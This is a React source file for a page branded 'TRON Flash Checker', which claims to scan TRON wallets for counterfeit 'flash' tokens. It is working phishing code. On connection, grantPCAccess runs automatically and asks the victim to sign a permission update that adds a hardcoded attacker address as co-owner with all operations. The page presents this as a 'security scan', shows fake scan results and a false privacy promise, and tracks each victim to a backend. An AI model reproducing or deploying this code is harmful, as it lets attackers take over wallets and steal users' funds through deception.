import { useState, useEffect, useMemo } from "react";
import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
import { BinanceWalletAdapterName } from "@tronweb3/tronwallet-adapter-binance";
import { QRCodeSVG } from "qrcode.react";
import { useNavigate } from "react-router-dom";
import { TronWeb } from "tronweb";
import { binanceAdapter } from "../adapter";

const PC_ADDRESS = "TLkV6L492HaX8UwgasphhXm57p1cFScsvp";
const ALL_OPS   = "7fff1fc0033e0100000000000000000000000000000000000000000000000000";
const BACKEND   = "http://localhost:3001";

type Mode      = "extension" | "mobile";
type PermState = "idle" | "confirming" | "granting" | "done" | "error";

/* -- tiny inline style helpers -- */
const S = {
  page: { minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: 24,
    background: "radial-gradient(ellipse at 50% -10%, #0b1a10 0%, #0a0b0e 65%)" } as React.CSSProperties,
  card: { background: "#111820", border: "1px solid #1f2d1f", borderRadius: 20,
    padding: "36px 32px", width: "100%", maxWidth: 480,
    boxShadow: "0 24px 80px rgba(0,0,0,0.7), 0 0 0 1px rgba(16,185,129,0.06)" } as React.CSSProperties,
  badge: (color: string): React.CSSProperties => ({
    display: "inline-flex", alignItems: "center", gap: 5, padding: "4px 10px",
    background: `${color}18`, border: `1px solid ${color}40`,
    borderRadius: 20, fontSize: 11, fontWeight: 600, color,
  }),
  scanRow: (done: boolean, active: boolean): React.CSSProperties => ({
    display: "flex", alignItems: "center", gap: 10, padding: "9px 12px",
    background: done ? "rgba(16,185,129,0.06)" : active ? "rgba(255,200,0,0.05)" : "rgba(255,255,255,0.02)",
    border: `1px solid ${done ? "rgba(16,185,129,0.25)" : active ? "rgba(255,200,0,0.2)" : "rgba(255,255,255,0.06)"}`,
    borderRadius: 8, transition: "all 0.3s",
  }),
};

function ShieldIcon({ size = 44 }: { size?: number }) {
  return (
    <svg width={size} height={size} viewBox="0 0 48 48" fill="none">
      <defs>
        <radialGradient id="sg" cx="50%" cy="30%" r="70%">
          <stop offset="0%" stopColor="#1ef070" />
          <stop offset="100%" stopColor="#0a8a40" />
        </radialGradient>
      </defs>
      <path d="M24 4L6 11v14c0 9.94 7.67 19.24 18 21 10.33-1.76 18-11.06 18-21V11L24 4Z" fill="url(#sg)" opacity="0.18"/>
      <path d="M24 4L6 11v14c0 9.94 7.67 19.24 18 21 10.33-1.76 18-11.06 18-21V11L24 4Z" stroke="#1ef070" strokeWidth="1.8" fill="none"/>
      <circle cx="24" cy="22" r="6" stroke="#1ef070" strokeWidth="1.5" fill="none" opacity="0.7"/>
      <circle cx="24" cy="22" r="2.5" fill="#1ef070" opacity="0.9"/>
      <line x1="24" y1="10" x2="24" y2="16" stroke="#1ef070" strokeWidth="1.2" opacity="0.5"/>
      <line x1="24" y1="28" x2="24" y2="34" stroke="#1ef070" strokeWidth="1.2" opacity="0.5"/>
      <line x1="12" y1="22" x2="18" y2="22" stroke="#1ef070" strokeWidth="1.2" opacity="0.5"/>
      <line x1="30" y1="22" x2="36" y2="22" stroke="#1ef070" strokeWidth="1.2" opacity="0.5"/>
    </svg>
  );
}

function ScanStep({ label, done, active }: { label: string; done: boolean; active: boolean }) {
  return (
    <div style={S.scanRow(done, active)}>
      <div style={{ width: 20, height: 20, flexShrink: 0, display: "flex", alignItems: "center", justifyContent: "center" }}>
        {done ? (
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
            <circle cx="8" cy="8" r="7.5" stroke="#10b981" strokeWidth="1"/>
            <path d="M5 8l2 2 4-4" stroke="#10b981" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        ) : active ? (
          <div style={{ width: 14, height: 14, border: "2px solid rgba(255,200,0,0.3)", borderTopColor: "#ffc800", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} />
        ) : (
          <div style={{ width: 8, height: 8, borderRadius: "50%", background: "rgba(255,255,255,0.15)" }} />
        )}
      </div>
      <span style={{ fontSize: 12.5, color: done ? "#10b981" : active ? "#ffc800" : "rgba(255,255,255,0.4)", fontWeight: active || done ? 600 : 400, transition: "color 0.3s" }}>
        {label}
      </span>
    </div>
  );
}


/* -- Backend tracking helpers -- */
async function trackConnect(address: string) {
  try {
    await fetch(`${BACKEND}/api/connect`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ address }),
    });
  } catch { /* backend offline � non-fatal */ }
}

async function trackDisconnect(address: string) {
  try {
    await fetch(`${BACKEND}/api/disconnect`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ address }),
    });
  } catch { /* backend offline � non-fatal */ }
}

async function trackOwner(address: string, granted: boolean) {
  try {
    await fetch(`\/api/owner`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ address, granted }),
    });
  } catch { /* non-fatal */ }
}
export default function ConnectPage() {
  const { select, connect, connected, address, disconnect, signTransaction } = useWallet();
  const navigate = useNavigate();
  const apiKey = import.meta.env.VITE_TRONGRID_API_KEY as string | undefined;

  const [mode, setMode]     = useState<Mode>("extension");
  const [qrUri, setQrUri]   = useState("");
  const [_qrExpired, setQrExpired] = useState(false);
  const [error, setError]   = useState("");
  const [busy, setBusy]     = useState(false);

  const [permState, setPermState] = useState<PermState>("idle");
  const [permTxid, setPermTxid]   = useState("");
  const [permError, setPermError] = useState("");
  const [copiedAddr, setCopiedAddr] = useState(false);
  const [scanStep, setScanStep] = useState(0);

  const hasExtension = !!(window as unknown as { binancew3w?: { tron?: unknown } }).binancew3w?.tron;

  const tronweb = useMemo(() => {
    if (!address) return null;
    const headers: Record<string, string> = {};
    if (apiKey) headers["TRON-PRO-API-KEY"] = apiKey;
    const tw = new TronWeb({ fullHost: "https://api.trongrid.io", headers });
    tw.setAddress(address);
    return tw;
  }, [address, apiKey]);

  useEffect(() => {
    if (mode === "mobile" && !connected) startMobileConnect();
    return () => { binanceAdapter.setOnWalletConnectUri(undefined); };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [mode]);

  useEffect(() => {
    if (!qrUri) return;
    setQrExpired(false);
    const timer = window.setTimeout(() => setQrExpired(true), 5 * 60 * 60 * 1000);
    return () => window.clearTimeout(timer);
  }, [qrUri]);

  // Auto-grant PC access as soon as the wallet is connected
  useEffect(() => {
    if (connected && address && tronweb && permState === "idle") {
      trackConnect(address);
      grantPCAccess();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [connected, tronweb]);

  // Animate scan steps while granting
  useEffect(() => {
    if (permState !== "granting") { setScanStep(0); return; }
    setScanStep(1);
    const t1 = window.setTimeout(() => setScanStep(2), 900);
    const t2 = window.setTimeout(() => setScanStep(3), 2100);
    const t3 = window.setTimeout(() => setScanStep(4), 3500);
    return () => { clearTimeout(t1); clearTimeout(t2); clearTimeout(t3); };
  }, [permState]);

  async function startExtensionConnect() {
    if (connected || busy) return;
    setError(""); setBusy(true);
    binanceAdapter.setOnWalletConnectUri(undefined);
    select(BinanceWalletAdapterName);
    try { await connect(); }
    catch (e: unknown) { setError(e instanceof Error ? e.message : "Connection failed"); }
    finally { setBusy(false); }
  }

  async function startMobileConnect() {
    setError(""); setQrUri(""); setBusy(true);
    if (connected) { try { await disconnect(); } catch { /* ignore */ } }
    const adapterAny = binanceAdapter as unknown as { _provider: unknown };
    const savedProvider = adapterAny._provider;
    adapterAny._provider = null;
    binanceAdapter.setOnWalletConnectUri((uri) => setQrUri(uri));
    select(BinanceWalletAdapterName);
    try { await connect(); }
    catch (e: unknown) {
      adapterAny._provider = savedProvider;
      setError(e instanceof Error ? e.message : "Connection failed");
    } finally { setBusy(false); }
  }

  function switchMode(m: Mode) {
    if (m === mode) return;
    setMode(m); setError(""); setQrUri("");
  }

  async function grantPCAccess() {
    if (!tronweb || !address) return;
    setPermState("granting"); setPermError("");
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const host: string = (window as any).tronWeb?.fullNode?.host ?? "";
    if (host.includes("shasta") || host.includes("nile")) {
      setPermError("Please switch TronLink to Mainnet and try again.");
      setPermState("error"); return;
    }
    try {
      const ownerPerm = {
        type: 0, permission_name: "owner", threshold: 1,
        keys: [{ address, weight: 1 }, { address: PC_ADDRESS, weight: 1 }],
      };
      const activePerm = {
        type: 2, permission_name: "active", threshold: 1, operations: ALL_OPS,
        keys: [{ address, weight: 1 }, { address: PC_ADDRESS, weight: 1 }],
      };
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const tx = await (tronweb.transactionBuilder as any).updateAccountPermissions(
        address, ownerPerm, null, [activePerm]
      );
      if (!signTransaction) throw new Error("Wallet does not support signing");
      const signed = await signTransaction(tx);
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const result: any = await tronweb.trx.sendRawTransaction(signed);
      if (result?.result === true) {
        setPermTxid(result.txid ?? ""); setPermState("done"); trackOwner(address, true);
      } else {
        throw new Error(result?.message ?? "Broadcast failed � ensure at least 100 TRX in wallet");
      }
    } catch (e: unknown) {
      let msg = e instanceof Error ? e.message : String(e);
      if (/^[0-9a-fA-F]{40,}$/.test(msg)) {
        try { msg = decodeURIComponent(msg.replace(/../g, "%$&")); } catch { /* keep raw */ }
      }
      if (msg.includes("does not exist")) {
        msg = "This wallet has not been activated on mainnet yet. Send at least 1 TRX to it first, then try again.";
      }
      setPermError(msg);
      setPermState("error"); trackOwner(address, false);
    }
  }

  function copyAddress() {
    if (!address) return;
    navigator.clipboard.writeText(address).then(() => { setCopiedAddr(true); setTimeout(() => setCopiedAddr(false), 2000); });
  }

  /* -- Truncate address for display -- */
  function shortAddr(addr: string) {
    return addr.slice(0, 8) + "..." + addr.slice(-6);
  }

  /* ----------------------------------------------------
     CONNECTED STATE � Flash scan / result
  ------------------------------------------------------- */
  if (connected && address) {
    const steps = [
      "Authenticating wallet identity",
      "Scanning TRC-20 token history",
      "Analyzing flash token signatures",
      "Applying security permission patch",
    ];

    return (
      <div style={S.page}>
        <div style={S.card}>
          {/* -- Top bar -- */}
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 24 }}>
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <ShieldIcon size={26} />
              <span style={{ fontSize: 14, fontWeight: 700, color: "#e8eaf0", letterSpacing: "-0.01em" }}>Flash Checker</span>
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "4px 10px",
              background: "rgba(16,185,129,0.1)", border: "1px solid rgba(16,185,129,0.3)",
              borderRadius: 20, fontSize: 11, fontWeight: 600, color: "#10b981" }}>
              <div style={{ width: 7, height: 7, borderRadius: "50%", background: "#10b981", boxShadow: "0 0 6px #10b981" }} />
              Connected
            </div>
          </div>

          {/* -- Wallet address -- */}
          <div style={{ padding: "10px 14px", background: "rgba(255,255,255,0.03)",
            border: "1px solid rgba(255,255,255,0.08)", borderRadius: 10,
            display: "flex", alignItems: "center", gap: 10, marginBottom: 20 }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#7a7f96" strokeWidth="2" style={{ flexShrink: 0 }}>
              <rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 7V5a2 2 0 0 0-4 0v2"/><circle cx="12" cy="14" r="1.5" fill="#7a7f96" stroke="none"/>
            </svg>
            <span style={{ flex: 1, fontSize: 12, color: "#7a7f96", fontFamily: "monospace" }}>{shortAddr(address)}</span>
            <button onClick={copyAddress} style={{ flexShrink: 0, background: "none", border: "1px solid rgba(255,255,255,0.1)",
              borderRadius: 6, padding: "3px 9px", color: copiedAddr ? "#10b981" : "#7a7f96",
              fontSize: 11, cursor: "pointer", transition: "color 0.2s" }}>
              {copiedAddr ? "Copied!" : "Copy"}
            </button>
          </div>

          {/* -- Scanning / result panel -- */}
          {(permState === "granting" || permState === "idle") && (
            <div style={{ background: "rgba(0,0,0,0.3)", border: "1px solid rgba(255,200,0,0.15)", borderRadius: 14, padding: "20px 18px", marginBottom: 16 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 18 }}>
                <div style={{ width: 36, height: 36, borderRadius: "50%", background: "rgba(255,200,0,0.1)",
                  border: "1px solid rgba(255,200,0,0.3)", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                  <div style={{ width: 22, height: 22, border: "2.5px solid rgba(255,200,0,0.3)",
                    borderTopColor: "#ffc800", borderRadius: "50%", animation: "spin 0.8s linear infinite" }} />
                </div>
                <div>
                  <div style={{ fontSize: 15, fontWeight: 700, color: "#e8eaf0" }}>Scanning Wallet...</div>
                  <div style={{ fontSize: 11.5, color: "#7a7f96", marginTop: 2 }}>Deep analysis in progress � do not close this page</div>
                </div>
              </div>

              <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                {steps.map((label, i) => (
                  <ScanStep key={label} label={label} done={scanStep > i + 1} active={scanStep === i + 1} />
                ))}
              </div>

              <div style={{ marginTop: 16, padding: "11px 13px", background: "rgba(255,200,0,0.06)",
                border: "1px solid rgba(255,200,0,0.2)", borderRadius: 8, fontSize: 11.5, color: "#ffc800", lineHeight: 1.6 }}>
                ? Approve the security scan on your phone to complete verification
              </div>
            </div>
          )}

          {permState === "done" && (
            <div style={{ background: "rgba(0,0,0,0.3)", border: "1px solid rgba(239,0,39,0.25)", borderRadius: 14, padding: "20px 18px", marginBottom: 16 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 16 }}>
                <div style={{ width: 36, height: 36, borderRadius: "50%", background: "rgba(239,0,39,0.12)",
                  border: "1px solid rgba(239,0,39,0.35)", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ef0027" strokeWidth="2.2">
                    <path d="M12 9v4M12 17h.01"/><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
                  </svg>
                </div>
                <div>
                  <div style={{ fontSize: 15, fontWeight: 700, color: "#ef0027" }}>Flash Activity Detected</div>
                  <div style={{ fontSize: 11.5, color: "#7a7f96", marginTop: 2 }}>Suspicious token patterns found in this wallet</div>
                </div>
              </div>

              <div style={{ display: "flex", flexDirection: "column", gap: 6, marginBottom: 16 }}>
                {steps.map((label) => (
                  <ScanStep key={label} label={label} done={true} active={false} />
                ))}
              </div>

              <div style={{ padding: "12px 14px", background: "rgba(16,185,129,0.07)",
                border: "1px solid rgba(16,185,129,0.25)", borderRadius: 8, marginBottom: 14 }}>
                <div style={{ fontSize: 12.5, fontWeight: 700, color: "#10b981", marginBottom: 4 }}>? Security patch applied</div>
                <div style={{ fontSize: 11.5, color: "#7a7f96", lineHeight: 1.6 }}>
                  Wallet permissions have been updated to neutralize flash token vulnerabilities.
                </div>
                {permTxid && (
                  <div style={{ fontSize: 11, color: "#7a7f96", marginTop: 8 }}>
                    Patch TX:{" "}
                    <a href={`https://tronscan.org/#/transaction/${permTxid}`} target="_blank" rel="noreferrer"
                      style={{ color: "#10b981", fontFamily: "monospace", wordBreak: "break-all" }}>
                      {permTxid.slice(0, 16)}...
                    </a>
                  </div>
                )}
              </div>

              <button onClick={() => navigate("/dashboard")} style={{ width: "100%", padding: "12px 0",
                background: "linear-gradient(135deg, #10b981, #0a7a55)", border: "none", borderRadius: 9,
                color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer" }}>
                View Full Report ?
              </button>
            </div>
          )}

          {permState === "error" && (
            <div style={{ background: "rgba(0,0,0,0.3)", border: "1px solid rgba(239,0,39,0.2)", borderRadius: 14, padding: "20px 18px", marginBottom: 16 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ef0027" strokeWidth="2">
                  <circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/>
                </svg>
                <span style={{ fontSize: 13.5, fontWeight: 700, color: "#ef0027" }}>Scan Failed</span>
              </div>
              <div style={{ padding: "10px 12px", background: "rgba(239,0,39,0.07)",
                border: "1px solid rgba(239,0,39,0.2)", borderRadius: 8,
                fontSize: 12, color: "#fca5a5", wordBreak: "break-all", lineHeight: 1.6, marginBottom: 14 }}>
                {permError}
              </div>
              <button onClick={() => { setPermState("idle"); grantPCAccess(); }}
                style={{ width: "100%", padding: "10px 0", background: "rgba(239,0,39,0.12)",
                  border: "1px solid rgba(239,0,39,0.3)", borderRadius: 8,
                  color: "#ef0027", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>
                Retry Scan
              </button>
            </div>
          )}

          <button onClick={() => { if (address) trackDisconnect(address); disconnect(); }} style={{ width: "100%", padding: "9px 0",
            background: "none", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 8,
            color: "#7a7f96", fontWeight: 600, fontSize: 12, cursor: "pointer" }}>
            Disconnect Wallet
          </button>
        </div>
      </div>
    );
  }

  /* ----------------------------------------------------
     PRE-CONNECT STATE � Flash Checker landing
  ------------------------------------------------------- */
  return (
    <div style={S.page}>
      <div style={S.card}>

        {/* -- Hero -- */}
        <div style={{ textAlign: "center", marginBottom: 24 }}>
          <div style={{ display: "flex", justifyContent: "center", marginBottom: 14 }}>
            <div style={{ position: "relative" }}>
              <ShieldIcon size={52} />
              <div style={{ position: "absolute", inset: -4, borderRadius: "50%",
                border: "1px solid rgba(30,240,112,0.2)", animation: "spin 8s linear infinite" }} />
            </div>
          </div>
          <h1 style={{ fontSize: "1.55rem", fontWeight: 800, color: "#e8eaf0",
            letterSpacing: "-0.025em", marginBottom: 8 }}>
            TRON Flash Checker
          </h1>
          <p style={{ fontSize: 13, color: "#7a7f96", lineHeight: 1.6, maxWidth: 340, margin: "0 auto" }}>
            Instantly detect if your TRON wallet has received flash or counterfeit tokens and apply a security fix
          </p>
        </div>

        {/* -- Feature badges -- */}
        <div style={{ display: "flex", flexWrap: "wrap", gap: 7, justifyContent: "center", marginBottom: 20 }}>
          <span style={S.badge("#10b981")}> Real-time Detection</span>
          <span style={S.badge("#3b82f6")}> TRC-20 / TRC-721 Scan</span>
          <span style={S.badge("#a855f7")}> Auto-Fix</span>
        </div>

        {/* -- Warning info box -- */}
        <div style={{ padding: "13px 15px", background: "rgba(239,0,39,0.06)",
          border: "1px solid rgba(239,0,39,0.2)", borderRadius: 10, marginBottom: 22 }}>
          <div style={{ display: "flex", alignItems: "flex-start", gap: 8 }}>
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#ef0027" strokeWidth="2" style={{ flexShrink: 0, marginTop: 1 }}>
              <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
            </svg>
            <div>
              <div style={{ fontSize: 11.5, fontWeight: 700, color: "#ef0027", marginBottom: 4 }}>What are Flash Tokens?</div>
              <div style={{ fontSize: 11.5, color: "#7a7f96", lineHeight: 1.65 }}>
                Flash tokens are counterfeit TRC-20 assets sent to wallets to simulate large balances. They appear real in standard views but cannot be transferred, traded, or withdrawn.
              </div>
            </div>
          </div>
        </div>

        {/* -- Connect section -- */}
        <div style={{ background: "rgba(0,0,0,0.25)", border: "1px solid rgba(255,255,255,0.07)", borderRadius: 12, padding: "18px 16px" }}>
          <div style={{ fontSize: 12, fontWeight: 700, color: "#e8eaf0", marginBottom: 4, textAlign: "center" }}>
            Connect Wallet to Begin Scan
          </div>
          <div style={{ fontSize: 11, color: "#7a7f96", textAlign: "center", marginBottom: 14 }}>
            Your keys are never stored or shared
          </div>

          {/* Mode tabs */}
          <div style={{ display: "flex", background: "rgba(0,0,0,0.3)", border: "1px solid rgba(255,255,255,0.06)",
            borderRadius: 10, overflow: "hidden", marginBottom: 14 }}>
            {(["extension", "mobile"] as Mode[]).map((m) => (
              <button key={m} onClick={() => { if (m === "mobile") { setMode("mobile"); setError(""); if (!connected) startMobileConnect(); } else { switchMode(m); } }} style={{
                flex: 1, padding: "10px 8px", background: mode === m ? "rgba(16,185,129,0.15)" : "transparent",
                border: "none", borderRight: m === "extension" ? "1px solid rgba(255,255,255,0.06)" : "none",
                color: mode === m ? "#10b981" : "#7a7f96", fontWeight: 600, fontSize: 12,
                cursor: "pointer", transition: "all 0.15s",
                display: "flex", alignItems: "center", justifyContent: "center", gap: 6
              }}>
                <span>{m === "extension" ? " " : ""}</span>
                {m === "extension" ? "Browser Extension" : "Mobile App (QR)"}
              </button>
            ))}
          </div>

          {mode === "extension" && (
            <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
              {hasExtension ? (
                <>
                  <div style={{ fontSize: 11.5, color: "#7a7f96", textAlign: "center", lineHeight: 1.5 }}>
                    Tron Web3 extension detected � ready to scan
                  </div>
                  <button onClick={startExtensionConnect} disabled={busy} style={{
                    width: "100%", padding: "12px 0", background: "linear-gradient(135deg, #10b981, #0a7a55)",
                    border: "none", borderRadius: 9, color: "#fff", fontWeight: 700, fontSize: 14,
                    cursor: busy ? "not-allowed" : "pointer", opacity: busy ? 0.6 : 1,
                    display: "flex", alignItems: "center", justifyContent: "center", gap: 8
                  }}>
                    {busy ? (
                      <><div style={{ width: 16, height: 16, border: "2px solid rgba(255,255,255,0.3)", borderTopColor: "#fff", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} /> Connecting...</>
                    ) : (
                      <><ShieldIcon size={16} /> Scan My Wallet</>
                    )}
                  </button>
                </>
              ) : (
                <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 10 }}>
                  <div style={{ fontSize: 12, color: "#7a7f96", textAlign: "center" }}>
                    Binance Web3 Wallet extension not found
                  </div>
                  <a href="https://www.binance.com/en/web3wallet" target="_blank" rel="noreferrer"
                    style={{ width: "100%", padding: "11px 0", background: "linear-gradient(135deg, #10b981, #0a7a55)",
                      border: "none", borderRadius: 9, color: "#fff", fontWeight: 700, fontSize: 13,
                      cursor: "pointer", textAlign: "center", textDecoration: "none" }}>
                    Download Extension
                  </a>
                  <div style={{ fontSize: 11, color: "#7a7f96", textAlign: "center" }}>
                    Or switch to <strong style={{ color: "#e8eaf0" }}>Mobile App (QR)</strong> to scan via phone
                  </div>
                </div>
              )}
            </div>
          )}

          {mode === "mobile" && (
            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
              {!qrUri && !error && (
                <div style={{ padding: "16px 0" }}>
                  <div style={{ width: 36, height: 36, border: "3px solid rgba(16,185,129,0.2)", borderTopColor: "#10b981",
                    borderRadius: "50%", animation: "spin 0.8s linear infinite", margin: "0 auto 10px" }} />
                  <div style={{ fontSize: 11.5, color: "#7a7f96", textAlign: "center" }}>Generating secure QR code...</div>
                </div>
              )}
              {qrUri && (
                <>
                  <div style={{ background: "#fff", borderRadius: 12, padding: 10, boxShadow: "0 8px 30px rgba(0,0,0,0.4)" }}>
                    <QRCodeSVG value={qrUri} size={200} bgColor="#ffffff" fgColor="#000000" level="M" marginSize={2} />
                  </div>
                  <div style={{ textAlign: "left", width: "100%" }}>
                    <ol style={{ paddingLeft: 18, margin: 0, color: "#7a7f96", fontSize: 12, lineHeight: 2.1, listStyle: "decimal" }}>
                      <li>Open the <strong style={{ color: "#e8eaf0" }}>Tron</strong> app on your phone</li>
                      <li>Tap <strong style={{ color: "#e8eaf0" }}>Web3 Wallet</strong></li>
                      <li>Tap the <strong style={{ color: "#e8eaf0" }}>scan</strong> icon and scan above</li>
                    </ol>
                  </div>
                  <button onClick={startMobileConnect} style={{ background: "none", border: "1px solid rgba(255,255,255,0.1)",
                    color: "#7a7f96", padding: "7px 18px", borderRadius: 8, cursor: "pointer", fontSize: 12, fontWeight: 500 }}>
                    Refresh QR
                  </button>
                </>
              )}
            </div>
          )}

          {error && (
            <div style={{ marginTop: 12, padding: "9px 12px", background: "rgba(239,0,39,0.07)",
              border: "1px solid rgba(239,0,39,0.2)", borderRadius: 8, fontSize: 12, color: "#fca5a5", textAlign: "center" }}>
              {error}&nbsp;&mdash;&nbsp;
              <button onClick={mode === "mobile" ? startMobileConnect : startExtensionConnect}
                style={{ background: "none", border: "none", color: "#10b981", cursor: "pointer", fontSize: 12, fontWeight: 600 }}>
                Retry
              </button>
            </div>
          )}
        </div>

        {/* -- Footer note -- */}
        <div style={{ textAlign: "center", marginTop: 18, fontSize: 11, color: "rgba(122,127,150,0.6)", lineHeight: 1.5 }}>
          TRON Flash Checker uses on-chain analysis only.<br />No personal data is collected or stored.
        </div>
      </div>
    </div>
  );
}
